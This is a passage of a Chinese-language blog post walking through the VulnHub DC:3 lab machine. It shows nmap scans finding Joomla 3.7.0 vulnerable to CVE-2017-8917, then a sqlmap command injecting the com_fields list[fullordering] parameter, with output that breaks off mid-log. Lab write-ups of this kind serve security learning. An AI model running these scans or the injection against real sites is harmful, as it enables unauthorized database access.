<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="google-site-verification" content="JleqOUPaJdGpfRPLH4e3NfODV87Fmag6pJBPvxKQKEc"><title>[vulnhub]  DC:3 | Terminal-001 | T3yT3y</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="/js/gitalk.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Brands';
 src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Free';
 src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[vulnhub]  DC:3</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-05-31T09:19:31.564Z" id="date"> 2023-05-31</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-05-31T12:48:31.548Z" id="updated"> 2023-05-31</time></div></span><br><span>Word Count: <div class="control">8.2k</div></span><br><span>Read Time: <div class="control">48 min</div></span></div></div><hr><div id="post-content"><p class='item-img' data-src='/pic/50c415267f296dc3cbcbae5b3c814fb27145378.jpg'><img src="/pic/50c415267f296dc3cbcbae5b3c814fb27145378.jpg" alt="50c415267f296dc3cbcbae5b3c814fb27145378"></p>
<span id="more"></span>

<h1 id="DC-3"><a href="#DC-3" class="headerlink" title="DC:3"></a>DC:3</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Vulnhub DC 系列第三台机子。主要是对Joomla CMS的渗透。</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/DC/3/workSpace]<br>└─$ sudo nmap -sn 192.168.56.0/24      <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-31 14:52 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.1<br>Host is up (0.00021s latency).<br>MAC Address: 0A:00:27:00:00:08 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.100<br>Host is up (0.00020s latency).<br>MAC Address: 08:00:27:B1:3D:71 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.111<br>Host is up (0.00085s latency).<br>MAC Address: 08:00:27:AC:D4:38 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.144<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 15.94 seconds<br>                                                                                             <br>┌──(kali㉿kali)-[~/vulnhub/DC/3/workSpace]<br>└─$ sudo nmap -p- --min-rate=10000 192.168.56.111<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-31 14:52 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.111<br>Host is up (0.00037s latency).<br>Not shown: 65534 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>80/tcp open  http<br>MAC Address: 08:00:27:AC:D4:38 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 5.91 seconds<br>                                                                                                       <br>┌──(kali㉿kali)-[~/vulnhub/DC/3/workSpace]<br>└─$ sudo nmap -sT -sV -sC -O -p80 192.168.56.111<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-31 14:53 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.111<br>Host is up (0.0011s latency).<br><br>PORT   STATE SERVICE VERSION<br>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br>|_http-title: Home<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>|_http-generator: Joomla! - Open Source Content Management<br>MAC Address: 08:00:27:AC:D4:38 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.91 seconds<br>                                                                                             <br>┌──(kali㉿kali)-[~/vulnhub/DC/3/workSpace]<br>└─$ sudo nmap --script=vuln 192.168.56.111      <br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-31 14:55 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.111<br>Host is up (0.00038s latency).<br>Not shown: 999 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>80/tcp open  http<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">| http-slowloris-check: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Slowloris DOS attack</span><br><span class="hljs-string">|     State: LIKELY VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2007-6750</span><br><span class="hljs-string">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="hljs-string">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="hljs-string">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="hljs-string">|       the http server&#x27;</span>s resources causing Denial Of Service.<br>|       <br>|     Disclosure <span class="hljs-built_in">date</span>: 2009-09-17<br>|     References:<br>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750<br>|_      http://ha.ckers.org/slowloris/<br>| http-vuln-cve2017-8917: <br>|   VULNERABLE:<br>|   Joomla! 3.7.0 <span class="hljs-string">&#x27;com_fields&#x27;</span> SQL Injection Vulnerability<br>|     State: VULNERABLE<br>|     IDs:  CVE:CVE-2017-8917<br>|     Risk <span class="hljs-built_in">factor</span>: High  CVSSv3: 9.8 (CRITICAL) (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)<br>|       An SQL injection vulnerability <span class="hljs-keyword">in</span> Joomla! 3.7.x before 3.7.1 allows attackers<br>|       to execute aribitrary SQL commands via unspecified vectors.<br>|       <br>|     Disclosure <span class="hljs-built_in">date</span>: 2017-05-17<br>|     Extra information:<br>|       User: root@localhost<br>|     References:<br>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8917<br>|_      https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|   /administrator/: Possible admin folder</span><br><span class="hljs-string">|   /administrator/index.php: Possible admin folder</span><br><span class="hljs-string">|   /administrator/manifests/files/joomla.xml: Joomla version 3.7.0</span><br><span class="hljs-string">|   /language/en-GB/en-GB.xml: Joomla version 3.7.0</span><br><span class="hljs-string">|   /htaccess.txt: Joomla!</span><br><span class="hljs-string">|   /README.txt: Interesting, a readme.</span><br><span class="hljs-string">|   /bin/: Potentially interesting folder</span><br><span class="hljs-string">|   /cache/: Potentially interesting folder</span><br><span class="hljs-string">|   /images/: Potentially interesting folder</span><br><span class="hljs-string">|   /includes/: Potentially interesting folder</span><br><span class="hljs-string">|   /libraries/: Potentially interesting folder</span><br><span class="hljs-string">|   /modules/: Potentially interesting folder</span><br><span class="hljs-string">|   /templates/: Potentially interesting folder</span><br><span class="hljs-string">|_  /tmp/: Potentially interesting folder</span><br><span class="hljs-string">| http-internal-ip-disclosure: </span><br><span class="hljs-string">|_  Internal IP Leaked: 127.0.1.1</span><br><span class="hljs-string">| http-csrf: </span><br><span class="hljs-string">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.111</span><br><span class="hljs-string">|   Found the following possible CSRF vulnerabilities: </span><br><span class="hljs-string">|     </span><br><span class="hljs-string">|     Path: http://192.168.56.111:80/</span><br><span class="hljs-string">|     Form id: login-form</span><br><span class="hljs-string">|     Form action: /index.php</span><br><span class="hljs-string">|     </span><br><span class="hljs-string">|     Path: http://192.168.56.111:80/index.php/component/users/?view=reset&amp;amp;Itemid=101</span><br><span class="hljs-string">|     Form id: user-registration</span><br><span class="hljs-string">|     Form action: /index.php/component/users/?task=reset.request&amp;Itemid=101</span><br><span class="hljs-string">|     </span><br><span class="hljs-string">|     Path: http://192.168.56.111:80/index.php/component/users/?view=reset&amp;amp;Itemid=101</span><br><span class="hljs-string">|     Form id: login-form</span><br><span class="hljs-string">|     Form action: /index.php/component/users/?Itemid=101</span><br><span class="hljs-string">|     </span><br><span class="hljs-string">|     Path: http://192.168.56.111:80/index.php/2-uncategorised/1-welcome</span><br><span class="hljs-string">|     Form id: login-form</span><br><span class="hljs-string">|     Form action: /index.php</span><br><span class="hljs-string">|     </span><br><span class="hljs-string">|     Path: http://192.168.56.111:80/index.php/component/users/?view=remind&amp;amp;Itemid=101</span><br><span class="hljs-string">|     Form id: user-registration</span><br><span class="hljs-string">|     Form action: /index.php/component/users/?task=remind.remind&amp;Itemid=101</span><br><span class="hljs-string">|     </span><br><span class="hljs-string">|     Path: http://192.168.56.111:80/index.php/component/users/?view=remind&amp;amp;Itemid=101</span><br><span class="hljs-string">|     Form id: login-form</span><br><span class="hljs-string">|     Form action: /index.php/component/users/?Itemid=101</span><br><span class="hljs-string">|     </span><br><span class="hljs-string">|     Path: http://192.168.56.111:80/index.php</span><br><span class="hljs-string">|     Form id: login-form</span><br><span class="hljs-string">|_    Form action: /index.php</span><br><span class="hljs-string">MAC Address: 08:00:27:AC:D4:38 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 321.70 seconds</span><br></code></pre></td></tr></table></figure>

<p>发现只开了80端口，那说明是要一条路走到黑了。</p>
<p>不过好处是扫描扫出来了存在<code>Joomla! 3.7.0 &#39;com_fields&#39; SQL Injection Vulnerability</code>这个漏洞。说明80端口跑的是基于Joomla搭建的网站且有SQL注入漏洞。</p>
<h2 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h2><p>那就直接下手。</p>
<h3 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h3><p>按照exp里的利用方式先用sqlmap试试。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/DC/3/workSpace]<br>└─$ sudo sqlmap -u <span class="hljs-string">&quot;http://192.168.56.111/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent --dbs -p list[fullordering]<br>        ___<br>       __H__                                                                                 <br> ___ ___[(]_____ ___ ___  &#123;1.7.2<span class="hljs-comment">#stable&#125;                                                     </span><br>|_ -| . [(]     | .<span class="hljs-string">&#x27;| . |                                                                    </span><br><span class="hljs-string">|___|_  [.]_|_|_|__,|  _|                                                                    </span><br><span class="hljs-string">      |_|V...       |_|   https://sqlmap.org                                                 </span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="hljs-built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="hljs-keyword">for</span> any misuse or damage caused by this program<br><br>[*] starting @ 15:08:09 /2023-05-31/<br><br>[15:08:09] [INFO] fetched random HTTP User-Agent header value <span class="hljs-string">&#x27;Opera/9.10 (X11; Linux i386; U; en)&#x27;</span> from file <span class="hljs-string">&#x27;/usr/share/sqlmap/data/txt/user-agents.txt&#x27;</span>                                <br>[15:08:10] [INFO] testing connection to the target URL<br>[15:08:10] [WARNING] the web server responded with an HTTP error code (500) <span class="hljs-built_in">which</span> could interfere with the results of the tests<br>you have not declared cookie(s), <span class="hljs-keyword">while</span> server wants to <span class="hljs-built_in">set</span> its own (<span class="hljs-string">&#x27;460ada11b31d3c5e5ca6e58fd5d3de27=onljp83m4d8...cvdtmls307&#x27;</span>). Do you want to use those [Y/n] <br>[15:08:16] [INFO] checking <span class="hljs-keyword">if</span> the target is protected by some kind of WAF/IPS<br>[15:08:16] [INFO] testing <span class="hljs-keyword">if</span> the target URL content is stable<br>[15:08:16] [INFO] target URL content is stable<br>[15:08:16] [INFO] heuristic (basic) <span class="hljs-built_in">test</span> shows that GET parameter <span class="hljs-string">&#x27;list[fullordering]&#x27;</span> might be injectable (possible DBMS: <span class="hljs-string">&#x27;MySQL&#x27;</span>)<br>[15:08:16] [INFO] testing <span class="hljs-keyword">for</span> SQL injection on GET parameter <span class="hljs-string">&#x27;list[fullordering]&#x27;</span><br>it looks like the back-end DBMS is <span class="hljs-string">&#x27;MySQL&#x27;</span>. Do you want to skip <span class="hljs-built_in">test</span> payloads specific <span class="hljs-keyword">for</span> other DBMSes? [Y/n] <br>[15:08:17] [INFO] testing <span class="hljs-string">&#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;</span><br>[15:08:18] [WARNING] reflective value(s) found and filtering out<br>[15:08:21] [INFO] testing <span class="hljs-string">&#x27;OR boolean-based blind - WHERE or HAVING clause&#x27;</span><br>[15:08:23] [INFO] testing <span class="hljs-string">&#x27;OR boolean-based blind - WHERE or HAVING clause (NOT)&#x27;</span><br>[15:08:25] [INFO] testing <span class="hljs-string">&#x27;AND boolean-based blind - WHERE or HAVING clause (subquery - comment)&#x27;</span>                                                                                         <br>[15:08:27] [INFO] testing <span class="hljs-string">&#x27;OR boolean-based blind - WHERE or HAVING clause (subquery - comment)&#x27;</span>                                                                                          <br>[15:08:29] [INFO] testing <span class="hljs-string">&#x27;AND boolean-based blind - WHERE or HAVING clause (comment)&#x27;</span><br>[15:08:30] [INFO] testing <span class="hljs-string">&#x27;OR boolean-based blind - WHERE or HAVING clause (comment)&#x27;</span><br>[15:08:31] [INFO] testing <span class="hljs-string">&#x27;OR boolean-based blind - WHERE or HAVING clause (NOT - comment)&#x27;</span><br>[15:08:32] [INFO] testing <span class="hljs-string">&#x27;Boolean-based blind - Parameter replace (original value)&#x27;</span><br>[15:08:32] [INFO] testing <span class="hljs-string">&#x27;Boolean-based blind - Parameter replace (DUAL)&#x27;</span><br>[15:08:32] [INFO] testing <span class="hljs-string">&#x27;Boolean-based blind - Parameter replace (DUAL - original value)&#x27;</span><br>[15:08:33] [INFO] testing <span class="hljs-string">&#x27;Boolean-based blind - Parameter replace (CASE)&#x27;</span><br>[15:08:33] [INFO] testing <span class="hljs-string">&#x27;Boolean-based blind - Parameter replace (CASE - original value)&#x27;</span><br>[15:08:33] [INFO] testing <span class="hljs-string">&#x27;HAVING boolean-based blind - WHERE, GROUP BY clause&#x27;</span><br>[15:08:35] [INFO] testing <span class="hljs-string">&#x27;Generic inline queries&#x27;</span><br>[15:08:35] [INFO] testing <span class="hljs-string">&#x27;AND boolean-based blind - WHERE or HAVING clause (MySQL comment)&#x27;</span><br>[15:08:36] [INFO] testing <span class="hljs-string">&#x27;OR boolean-based blind - WHERE or HAVING clause (MySQL comment)&#x27;</span><br>[15:08:37] [INFO] testing <span class="hljs-string">&#x27;OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)&#x27;</span>                                                                                         <br>[15:08:38] [INFO] testing <span class="hljs-string">&#x27;MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause&#x27;</span>                                                                                  <br>[15:08:40] [INFO] testing <span class="hljs-string">&#x27;MySQL AND boolean-based blind - 